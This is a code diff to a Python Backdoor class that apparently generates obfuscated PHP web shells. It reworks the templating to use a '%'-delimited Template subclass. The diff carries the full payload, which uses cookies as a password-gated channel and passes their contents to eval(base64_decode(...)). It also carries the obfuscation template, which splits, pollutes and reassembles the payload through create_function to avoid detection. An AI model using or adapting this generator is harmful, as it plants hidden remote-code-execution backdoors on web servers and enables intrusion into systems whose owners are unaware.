@@ -22,16 +22,20 @@ from random import random, randrange, choice, shuffle
 from pollution import pollute_with_static_str
 from core.utils import randstr
 from core.moduleexception import ModuleException
+from string import Template
 
 WARN_SHORT_PWD = 'Invalid password, use words longer than 3 characters'
+
+class BdTemplate(Template):
+    delimiter = '%'
 
 class Backdoor:
 
 	payload_template= """
 $c='count';
 $a=$_COOKIE;
-if(reset($a)=='%%%START_KEY%%%' && $c($a)>3){
-$k='%%%END_KEY%%%';
+if(reset($a)=='%STARTKEY' && $c($a)>3){
+$k='%ENDKEY';
 echo '<'.$k.'>';
 eval(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));
 echo '</'.$k.'>';
@@ -39,14 +43,14 @@ echo '</'.$k.'>';
 """
 
 	backdoor_template = """<?php
-$%%PAY_VAR1%%="%%PAYLOAD1%%";
-$%%PAY_VAR2%%="%%PAYLOAD2%%";
-$%%PAY_VAR3%%="%%PAYLOAD3%%";
-$%%PAY_VAR4%%="%%PAYLOAD4%%";
-$%%REPL_FUNC%% = str_replace("%%REPL_POLLUTION%%","","%%REPL_ENCODED%%");
-$%%B64_FUNC%% = $%%REPL_FUNC%%("%%B64_POLLUTION%%", "", "%%B64_ENCODED%%");
-$%%CREATFUNC%% = $%%REPL_FUNC%%("%%CREATFUNC_POLLUTION%%","","%%CREATFUNC_ENCODED%%");
-$%%FINALFUNC%% = $%%CREATFUNC%%('', $%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLLUTION%%", "", $%%PAY_VAR1%%.$%%PAY_VAR2%%.$%%PAY_VAR3%%.$%%PAY_VAR4%%))); $%%FINALFUNC%%();
+$%PAY_VAR1="%PAY1";
+$%PAY_VAR2="%PAY2";
+$%PAY_VAR3="%PAY3";
+$%PAY_VAR4="%PAY4";
+$%REPL_FUNC = str_replace("%REPL_POLL","","%REPL_ENC");
+$%B64_FUNC = $%REPL_FUNC("%B64_POLL", "", "%B64_ENC");
+$%CREAT_FUNC = $%REPL_FUNC("%CREAT_POLL","","%CREAT_ENC");
+$%FINAL_FUNC = $%CREAT_FUNC('', $%B64_FUNC($%REPL_FUNC("%PAY_POLL", "", $%PAY_VAR1.$%PAY_VAR2.$%PAY_VAR3.$%PAY_VAR4))); $%FINAL_FUNC();
 ?>"""
 
 	def __init__( self, password ):
@@ -57,7 +61,8 @@ $%%FINALFUNC%% = $%%CREATFUNC%%('', $%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLL
 		self.password  = password
 		self.start_key = self.password[:2]
 		self.end_key   = self.password[2:]
-		self.payload   = self.payload_template.replace( '%%%START_KEY%%%', self.start_key ).replace( '%%%END_KEY%%%', self.end_key ).replace( '\n', '' )
+		self.payload = BdTemplate(self.payload_template).substitute(STARTKEY = self.start_key, ENDKEY = self.end_key).replace( '\n', '' )
+		
 		self.backdoor  = self.encode_template()
 
 	def __str__( self ):
@@ -91,26 +96,25 @@ $%%FINALFUNC%% = $%%CREATFUNC%%('', $%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLL
 		ts_splitted = [ts_splitted[0]] + ts_shuffled + ts_splitted[6:]
 		self.backdoor_template = '\n'.join(ts_splitted)
 		
-		template = self.backdoor_template.replace( '%%B64_ENCODED%%', b64_polluted )
-		template = template.replace( '%%B64_FUNC%%', b64_new_func_name )
-		template = template.replace( '%%CREATFUNC%%', createfunc_name )
-		template = template.replace( '%%CREATFUNC_ENCODED%%',  createfunc_polluted )
-		template = template.replace( '%%CREATFUNC_POLLUTION%%',  createfunc_pollution )
-		template = template.replace( '%%REPL_ENCODED%%',  repl_polluted )
-		template = template.replace( '%%REPL_POLLUTION%%',  repl_pollution )
-		template = template.replace( '%%REPL_FUNC%%', replace_new_func_name )
-		template = template.replace( '%%PAY_VAR1%%', payload_var[0] )
-		template = template.replace( '%%PAY_VAR2%%', payload_var[1] )
-		template = template.replace( '%%PAY_VAR3%%', payload_var[2] )
-		template = template.replace( '%%PAY_VAR4%%', payload_var[3] )
-		template = template.replace( '%%PAYLOAD_POLLUTION%%', payload_pollution )
-		template = template.replace( '%%B64_POLLUTION%%', b64_pollution )
-		template = template.replace( '%%PAYLOAD1%%', payload_polluted[:piece1] )
-		template = template.replace( '%%PAYLOAD2%%', payload_polluted[piece1:piece2] )
-		template = template.replace( '%%PAYLOAD3%%', payload_polluted[piece2:piece3] )
-		template = template.replace( '%%PAYLOAD4%%', payload_polluted[piece3:] )
-		template = template.replace( '%%FINALFUNC%%', final_func_name )
-		
-		
-		return template
+		return BdTemplate(self.backdoor_template).substitute(
+																B64_FUNC = b64_new_func_name,
+																B64_ENC = b64_polluted, 
+																B64_POLL = b64_pollution,
+																CREAT_FUNC = createfunc_name,
+																CREAT_ENC = createfunc_polluted,
+																CREAT_POLL = createfunc_pollution,
+																REPL_FUNC = replace_new_func_name,
+																REPL_ENC = repl_polluted,
+																REPL_POLL = repl_pollution,
+																PAY_VAR1 = payload_var[0],
+																PAY_VAR2 = payload_var[1],
+																PAY_VAR3 = payload_var[2],
+																PAY_VAR4 = payload_var[3],
+																PAY_POLL = payload_pollution, 
+																PAY1 = payload_polluted[:piece1],
+																PAY2 = payload_polluted[piece1:piece2],
+																PAY3 = payload_polluted[piece2:piece3],
+																PAY4 = payload_polluted[piece3:],
+																FINAL_FUNC = final_func_name)
+
 			
